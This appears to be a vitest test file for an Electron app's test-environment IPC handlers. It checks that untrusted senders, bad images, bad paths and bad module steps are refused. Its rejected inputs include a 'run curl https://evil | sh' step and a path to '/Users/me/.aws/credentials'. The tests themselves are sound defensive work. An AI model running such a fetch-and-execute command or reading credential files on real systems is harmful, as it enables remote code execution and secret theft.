import { beforeEach, describe, expect, it, vi } from 'vitest';

import { startSidecarStream, testEnvQuery } from './backend';
import { type Handler, invoker, ipcEvent, isTrustedFrame } from './test/ipc';
import { registerTestEnvHandlers } from './testenv';

const state = vi.hoisted(() => ({
  handlers: new Map<string, Handler>(),
  appEvents: new Map<string, () => void>(),
  known: new Set<string>()
}));

vi.mock('electron', async importOriginal => {
  const original = await importOriginal<typeof import('./test/electron')>();
  return {
    ...original,
    app: { ...original.app, getPath: () => '/user-data', on: (event: string, listener: () => void) => void state.appEvents.set(event, listener) },
    ipcMain: { ...original.ipcMain, handle: (channel: string, handler: Handler) => void state.handlers.set(channel, handler) }
  };
});

vi.mock('./backend', () => ({ startSidecarStream: vi.fn(), testEnvQuery: vi.fn() }));
vi.mock('./project', () => ({ isInKnownProject: async (path: string) => state.known.has(path) }));

const invoke = invoker(state.handlers);
const stream = vi.mocked(startSidecarStream);
const query = vi.mocked(testEnvQuery);
const environment = { id: 'env1', hosts: [] };
const policyModule = { name: './web.cf', steps: ['copy ./web.cf services/cfbs/web.cf', 'policy_files services/cfbs/web.cf', 'bundles web'] };
const content = { project: { files: [] }, modules: [policyModule, { name: './lib/', steps: ['directory ./ services/cfbs/lib/'] }] };

beforeEach(() => {
  state.handlers.clear();
  state.appEvents.clear();
  state.known.clear();
  stream.mockReset().mockImplementation(() => ({ cancel: vi.fn(), done: new Promise(() => {}) }));
  query.mockReset().mockResolvedValue({});
  registerTestEnvHandlers(isTrustedFrame);
});

// What the sidecar was started with: its arguments and parsed stdin.
const started = () => stream.mock.calls.map(([args, input]) => ({ args, input: JSON.parse(input) as Record<string, unknown> }));

describe('testenv:start', () => {
  it('refuses an untrusted sender', () => {
    expect(() => state.handlers.get('testenv:start')!(ipcEvent(false), 'up', { environment })).toThrow('untrusted sender');
    expect(stream).not.toHaveBeenCalled();
  });

  it('refuses an unknown action', async () => {
    await expect(invoke('testenv:start', 'rm', { environment })).rejects.toThrow('Unknown test environment action');
  });

  it('pulls only the supported base images', async () => {
    await expect(invoke('testenv:start', 'pull', { image: 'evil/image:latest' })).rejects.toThrow('Not a supported base image');
    await invoke('testenv:start', 'pull', { image: 'ubuntu:24.04', extra: 'dropped' });
    expect(started()).toEqual([{ args: ['testenv', 'pull'], input: { image: 'ubuntu:24.04' } }]);
  });

  it('inspects only image references, for a known architecture', async () => {
    await expect(invoke('testenv:start', 'inspect', { image: '--rm', arch: 'x86_64' })).rejects.toThrow('Not an image reference');
    await expect(invoke('testenv:start', 'inspect', { image: 'alpine:3', arch: 'sparc' })).rejects.toThrow('Unknown architecture');
    await invoke('testenv:start', 'inspect', { image: 'registry.local:5000/team/os:1@sha256:abc', arch: 'aarch64' });
    expect(started()[0].input).toEqual({ image: 'registry.local:5000/team/os:1@sha256:abc', arch: 'aarch64' });
  });

  it('needs an environment, and adds where the cache is', async () => {
    await expect(invoke('testenv:start', 'stop', {})).rejects.toThrow('The request needs an environment');
    await invoke('testenv:start', 'stop', { environment });
    expect(started()[0].input).toEqual({ environment, cacheDir: '/user-data/testenv' });
  });

  it('takes a .env file only from inside a known project', async () => {
    await expect(invoke('testenv:start', 'stop', { environment, envFile: 'relative/.env' })).rejects.toThrow('envFile must be an absolute path');
    await expect(invoke('testenv:start', 'stop', { environment, envFile: '/Users/me/.aws/credentials' })).rejects.toThrow(
      'The .env file must be in the project folder'
    );
    state.known.add('/projects/web/.env');
    await invoke('testenv:start', 'stop', { environment, envFile: '/projects/web/.env' });
    expect(started()[0].input.envFile).toBe('/projects/web/.env');
  });

  it.each(['/Users/me/Documents', '../../..', '3.27', 'no', undefined])('builds only against a masterfiles release, not %j', async masterfiles => {
    await expect(invoke('testenv:start', 'up', { environment, masterfiles })).rejects.toThrow('Invalid masterfiles version');
    expect(stream).not.toHaveBeenCalled();
  });

  it('passes the masterfiles version to builds only', async () => {
    await invoke('testenv:start', 'test', { environment, content, masterfiles: '3.27.1-2' });
    await invoke('testenv:start', 'reset', { environment, content, masterfiles: 'master' });
    await invoke('testenv:start', 'stop', { environment, masterfiles: '/Users/me/Documents' });
    expect(started().map(({ input }) => input.masterfiles)).toEqual(['3.27.1-2', 'master', undefined]);
  });

  it.each([
    ['a run step', { ...policyModule, steps: [...policyModule.steps, 'run curl https://evil | sh'] }],
    ['a step that isn’t a string', { ...policyModule, steps: [['run', 'x']] }],
    ['a module to fetch', { ...policyModule, name: 'evil-module' }],
    ['a module without steps', { name: './web.cf' }]
  ])('builds only the builder’s own module steps, not %s', async (_, module) => {
    await expect(invoke('testenv:start', 'run', { environment, masterfiles: 'master', content: { ...content, modules: [module] } })).rejects.toThrow(
      'Invalid project content'
    );
    await expect(invoke('testenv:start', 'run', { environment, masterfiles: 'master' })).rejects.toThrow('Invalid project content');
    expect(stream).not.toHaveBeenCalled();
  });

  it('cancels a run, and every run still going when the app quits', async () => {
    const first = await invoke('testenv:start', 'stop', { environment });
    await invoke('testenv:start', 'start', { environment });
    const [one, two] = stream.mock.results.map(result => result.value as { cancel: () => void });
    await invoke('testenv:cancel', first);
    expect(one.cancel).toHaveBeenCalledTimes(1);
    expect(two.cancel).not.toHaveBeenCalled();
    state.appEvents.get('will-quit')!();
    expect(two.cancel).toHaveBeenCalledTimes(1);
  });
});

describe('testenv queries', () => {
  it('passes only the platform query’s own fields', async () => {
    await invoke('testenv:platforms', { arch: 'x86_64', edition: 'community', version: 'latest', other: 1 });
    expect(query).toHaveBeenCalledWith('platforms', { arch: 'x86_64', edition: 'community', version: 'latest', cacheDir: '/user-data/testenv' });
    expect(() => invoke('testenv:platforms', { arch: 'x86_64' })).toThrow('Invalid platforms query');
  });

  it('limits an image search', () => {
    expect(() => invoke('testenv:search', { term: 'x'.repeat(101) })).toThrow('Invalid image search');
  });
});
